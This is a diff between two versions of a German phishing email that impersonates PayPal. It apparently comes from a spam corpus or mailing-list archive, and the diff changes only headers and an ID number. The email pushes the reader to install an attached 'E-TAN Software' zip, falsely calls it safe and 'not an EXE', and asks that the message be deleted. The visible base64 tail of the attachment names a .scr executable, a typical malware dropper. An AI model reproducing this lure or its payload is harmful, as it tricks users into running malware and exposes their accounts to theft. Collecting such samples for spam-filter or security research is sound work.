@@ -1,10 +1,10 @@
-From: "Harrison Tuttle" <support4825@paypal.de>
+From: "Vito Currie" <support2925@paypal.de>
 Subject: PayPal E-TAN Software Nr
-Date: Tue, 24 Dec 2002 04:47:22 -0100
-Message-ID: <01c2ab07$8bf27a40$01f954d9@support4825>
+Date: Fri, 6 Jul 2007 03:01:06 +0000
+Message-ID: <01c7bf79$e5a39700$7188e550@support2925>
 Mime-Version: 1.0
 Content-Type: multipart/mixed;
-  boundary="----=_NextPart_000_000E_01C2AB0F.EDB6E240"
+  boundary="----=_NextPart_000_000E_01C7BF82.4767FF00"
 Return-path: <owner-linux-input@atrey.karlin.mff.cuni.cz>
 Sender: owner-linux-input@atrey.karlin.mff.cuni.cz
 List-Help: <mailto:majordomo@atrey.karlin.mff.cuni.cz?body=help>
@@ -16,7 +16,7 @@ List-Id: linux-input@vger.kernel.org
 
 This is a multi-part message in MIME format.
 
-------=_NextPart_000_000E_01C2AB0F.EDB6E240
+------=_NextPart_000_000E_01C7BF82.4767FF00
 Content-Type: text/plain;
 	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
@@ -29,7 +29,7 @@ Bitte beachten Sie die Einfuhrung einer neuen Sicherheitsmassnahme.
 Unsere Programmierer haben fur Sie ein ausgeklugeltes, elektronisches E-Tan System entwickelt, die Ihre Arbeit mit PayPal Banking noch sichere macht.
 
 Wichtig
-Mit diesem Schreiben erhalten Sie einmalig ein Exemplar von Ihrem personlichen E-TAN Generator ID 666109976 . Bitte installieren Sie umgehend ihre personlich Software und entfernen Sie aus Sicherheitsgr&#252;nden diese Email aus ihren Postfach. Die Aktivierung der E-Tan Software wird gleich mit dem ersten Einloggen in Ihren PayPal Kundenbereich erfolgen.
+Mit diesem Schreiben erhalten Sie einmalig ein Exemplar von Ihrem personlichen E-TAN Generator ID 469226613 . Bitte installieren Sie umgehend ihre personlich Software und entfernen Sie aus Sicherheitsgr&#252;nden diese Email aus ihren Postfach. Die Aktivierung der E-Tan Software wird gleich mit dem ersten Einloggen in Ihren PayPal Kundenbereich erfolgen.
 
 WICHTIG - AUS SICHERHEITSGRUNDEN IST DAS PROGRAMM KEINE EXE DATEI - SIE KONNEN DIESE ABER ABSOLUT SICHER UND PROBLEMLOS INSTALLIEREN 
 
@@ -50,7 +50,7 @@ Wie sicher ist E-TAN?
 
 Mit freundlichen Grussen Ihr PayPal Team
 
-------=_NextPart_000_000E_01C2AB0F.EDB6E240
+------=_NextPart_000_000E_01C7BF82.4767FF00
 Content-Type: application/octet-stream;
 	name="E-TAN-Software_2.68.zip"
 Content-Transfer-Encoding: base64
@@ -248,4 +248,4 @@ dFOUP4SpdYjMmFL/I4nbwflckpayUR4u+C+Z/r9L/wBQSwECFAAUAAIACADrhKw2
 tsXTvfsiAAAAWAAAFwAAAAAAAAAAACAAAAAAAAAARS1UQU4tU29mdHdhcmVfMi42
 OC5zY3JQSwUGAAAAAAEAAQBFAAAAMCMAAAAA
 
-------=_NextPart_000_000E_01C2AB0F.EDB6E240--
+------=_NextPart_000_000E_01C7BF82.4767FF00--
